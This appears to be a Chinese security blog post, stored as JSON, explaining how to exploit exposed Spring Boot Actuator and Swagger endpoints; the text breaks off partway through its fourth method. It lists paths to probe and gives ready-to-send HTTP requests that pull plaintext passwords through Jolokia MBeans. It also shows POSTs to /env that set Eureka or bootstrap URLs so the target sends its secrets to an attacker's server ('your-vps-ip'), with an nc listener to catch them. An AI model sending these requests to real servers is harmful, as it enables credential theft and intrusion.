{"title":"spring boot信息泄露漏洞","uid":"fe6d0336657ab32bcff127817b4afc45","slug":"spring boot信息泄露漏洞","date":"2021-10-13T12:56:13.929Z","updated":"2021-10-13T12:57:24.344Z","comments":true,"path":"api/articles/spring boot信息泄露漏洞.json","keywords":null,"cover":null,"content":"<h1 id=\"一、路由地址及接口调用详情泄露\"><a href=\"#一、路由地址及接口调用详情泄露\" class=\"headerlink\" title=\"一、路由地址及接口调用详情泄露\"></a>一、路由地址及接口调用详情泄露</h1><pre><code>    开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等\n</code></pre>\n<p>直接访问以下两个 swagger 相关路由，验证漏洞是否存在：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">/v2/api-docs\n/swagger-ui.html<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">/swagger\n/api-docs\n/api.html\n/swagger-ui\n/swagger/codes\n/api/index.html\n/api/v2/api-docs\n/v2/swagger.json\n/swagger-ui/html\n/distv2/index.html\n/swagger/index.html\n/sw/swagger-ui.html\n/api/swagger-ui.html\n/static/swagger.json\n/user/swagger-ui.html\n/swagger-ui/index.html\n/swagger-dubbo/api-docs\n/template/swagger-ui.html\n/swagger/static/index.html\n/dubbo-provider/distv2/index.html\n/spring-security-rest/api/swagger-ui.html\n/spring-security-oauth-resource/swagger-ui.html<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre><code>    除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：\n</code></pre>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">/mappings\n/metrics\n/beans\n/configprops\n/actuator/metrics\n/actuator/mappings\n/actuator/beans\n/actuator/configprops<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p>\n<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>\n<h1 id=\"二、配置不当而暴露的路由\"><a href=\"#二、配置不当而暴露的路由\" class=\"headerlink\" title=\"二、配置不当而暴露的路由\"></a>二、配置不当而暴露的路由</h1><pre><code>   程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置\n</code></pre>\n<p>参考 <a href=\"https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints\">production-ready-endpoints</a> 和 <a href=\"https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt\">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">/actuator\n/auditevents\n/autoconfig\n/beans\n/caches\n/conditions\n/configprops\n/docs\n/dump\n/env\n/flyway\n/health\n/heapdump\n/httptrace\n/info\n/intergrationgraph\n/jolokia\n/logfile\n/loggers\n/liquibase\n/metrics\n/mappings\n/prometheus\n/refresh\n/scheduledtasks\n/sessions\n/shutdown\n/trace\n/threaddump\n/actuator/auditevents\n/actuator/beans\n/actuator/health\n/actuator/conditions\n/actuator/configprops\n/actuator/env\n/actuator/info\n/actuator/loggers\n/actuator/heapdump\n/actuator/threaddump\n/actuator/metrics\n/actuator/scheduledtasks\n/actuator/httptrace\n/actuator/mappings\n/actuator/jolokia\n/actuator/hystrix.stream<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>其中对寻找漏洞比较重要接口的有：</p>\n<ul>\n<li><p><code>/env</code>、<code>/actuator/env</code>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>\n</li>\n<li><p><code>/refresh</code>、<code>/actuator/refresh</code>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>\n</li>\n<li><p><code>/restart</code>、<code>/actuator/restart</code>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>\n</li>\n<li><p><code>/jolokia</code>、<code>/actuator/jolokia</code>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>\n</li>\n<li><p><code>/trace</code>、<code>/actuator/httptrace</code>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>\n</li>\n</ul>\n<h1 id=\"三、获取被星号脱敏的密码的明文（方法一）\"><a href=\"#三、获取被星号脱敏的密码的明文（方法一）\" class=\"headerlink\" title=\"三、获取被星号脱敏的密码的明文（方法一）\"></a>三、获取被星号脱敏的密码的明文（方法一）</h1><pre><code>    访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n</code></pre>\n<p>利用条件：</p>\n<ul>\n<li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>\n</li>\n<li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</p>\n</li>\n</ul>\n<h2 id=\"步骤一：-找到想要获取的属性名\"><a href=\"#步骤一：-找到想要获取的属性名\" class=\"headerlink\" title=\"步骤一： 找到想要获取的属性名\"></a>步骤一： 找到想要获取的属性名</h2><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>\n<h2 id=\"步骤二：-jolokia-调用相关-Mbean-获取明文\"><a href=\"#步骤二：-jolokia-调用相关-Mbean-获取明文\" class=\"headerlink\" title=\"步骤二： jolokia 调用相关 Mbean 获取明文\"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h2><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p>\n<ul>\n<li>调用 <code>org.springframework.boot</code> Mbean</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p></blockquote>\n<p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p></blockquote>\n<p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>调用其他 Mbean</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p></blockquote>\n<h1 id=\"四、获取被星号脱敏的密码的明文（方法二）\"><a href=\"#四、获取被星号脱敏的密码的明文（方法二）\" class=\"headerlink\" title=\"四、获取被星号脱敏的密码的明文（方法二）\"></a>四、获取被星号脱敏的密码的明文（方法二）</h1><p>利用条件：</p>\n<ul>\n<li><p>可以 GET 请求目标网站的 <code>/env</code></p>\n</li>\n<li><p>可以 POST 请求目标网站的 <code>/env</code></p>\n</li>\n<li><p>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</p>\n</li>\n<li><p>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</p>\n</li>\n<li><p>目标可以请求攻击者的服务器（请求可出外网）</p>\n</li>\n</ul>\n<p>利用方法：</p>\n<h2 id=\"步骤一：-找到想要获取的属性名-1\"><a href=\"#步骤一：-找到想要获取的属性名-1\" class=\"headerlink\" title=\"步骤一： 找到想要获取的属性名\"></a>步骤一： 找到想要获取的属性名</h2><pre><code>    GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n</code></pre>\n<h2 id=\"步骤二：-使用-nc-监听-HTTP-请求\"><a href=\"#步骤二：-使用-nc-监听-HTTP-请求\" class=\"headerlink\" title=\"步骤二： 使用 nc 监听 HTTP 请求\"></a>步骤二： 使用 nc 监听 HTTP 请求</h2><p>在自己控制的外网服务器上监听 80 端口：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">nc -lvk 80<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性\"><a href=\"#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性\" class=\"headerlink\" title=\"步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性\"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h2><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code>  中的  <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；<code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>\n<p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /env\nContent-Type: application/x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/env\nContent-Type: application/json\n\n&#123;\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:$&#123;security.user.password&#125;@your-vps-ip\"&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"步骤四：-刷新配置\"><a href=\"#步骤四：-刷新配置\" class=\"headerlink\" title=\"步骤四： 刷新配置\"></a>步骤四： 刷新配置</h2><p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /refresh\nContent-Type: application/x-www-form-urlencoded<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/refresh\nContent-Type: application/json<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"步骤五：-解码属性值\"><a href=\"#步骤五：-解码属性值\" class=\"headerlink\" title=\"步骤五： 解码属性值\"></a>步骤五： 解码属性值</h2><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">Authorization: Basic dmFsdWU6MTIzNDU2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>\n<h1 id=\"五、获取被星号脱敏的密码的明文（方法三）\"><a href=\"#五、获取被星号脱敏的密码的明文（方法三）\" class=\"headerlink\" title=\"五、获取被星号脱敏的密码的明文（方法三）\"></a>五、获取被星号脱敏的密码的明文（方法三）</h1><p>利用条件：</p>\n<ul>\n<li><p>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</p>\n</li>\n<li><p>目标可以请求攻击者的服务器（请求可出外网）</p>\n</li>\n</ul>\n<p>利用方法：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>参考 UUUUnotfound 提出的 ，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p></blockquote>\n<h2 id=\"步骤一：-找到想要获取的属性名-2\"><a href=\"#步骤一：-找到想要获取的属性名-2\" class=\"headerlink\" title=\"步骤一： 找到想要获取的属性名\"></a>步骤一： 找到想要获取的属性名</h2><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>\n<h2 id=\"步骤二：-使用-nc-监听-HTTP-请求-1\"><a href=\"#步骤二：-使用-nc-监听-HTTP-请求-1\" class=\"headerlink\" title=\"步骤二： 使用 nc 监听 HTTP 请求\"></a>步骤二： 使用 nc 监听 HTTP 请求</h2><p>在自己控制的外网服务器上监听 80 端口：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">nc -lvk 80<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"步骤三：-触发对外-http-请求\"><a href=\"#步骤三：-触发对外-http-请求\" class=\"headerlink\" title=\"步骤三： 触发对外 http 请求\"></a>步骤三： 触发对外 http 请求</h2><ul>\n<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li>\n</ul>\n<p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /env\nContent-Type: application/x-www-form-urlencoded\n\nspring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/env\nContent-Type: application/json\n\n&#123;\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=$&#123;security.user.password&#125;\"&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>\n</ul>\n<p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /env\nContent-Type: application/x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/env\nContent-Type: application/json\n\n&#123;\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/$&#123;security.user.password&#125;\"&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"步骤四：-刷新配置-1\"><a href=\"#步骤四：-刷新配置-1\" class=\"headerlink\" title=\"步骤四： 刷新配置\"></a>步骤四： 刷新配置</h2><p>spring 1.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /refresh\nContent-Type: application/x-www-form-urlencoded<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>spring 2.x</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">POST /actuator/refresh\nContent-Type: application/json<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"六、获取被星号脱敏的密码的明文（方法四）\"><a href=\"#六、获取被星号脱敏的密码的明文（方法四）\" class=\"headerlink\" title=\"六、获取被星号脱敏的密码的明文（方法四）\"></a>六、获取被星号脱敏的密码的明文（方法四）</h1><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>\n<p>利用条件：</p>\n<ul>\n<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>\n</ul>\n<p>利用方法：</p>\n<h2 id=\"步骤一：-找到想要获取的属性名-3\"><a href=\"#步骤一：-找到想要获取的属性名-3\" class=\"headerlink\" title=\"步骤一： 找到想要获取的属性名\"></a>步骤一： 找到想要获取的属性名</h2><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>\n<h2 id=\"步骤二：-下载-jvm-heap-信息\"><a href=\"#步骤二：-下载-jvm-heap-信息\" class=\"headerlink\" title=\"步骤二： 下载 jvm heap 信息\"></a>步骤二： 下载 jvm heap 信息</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path 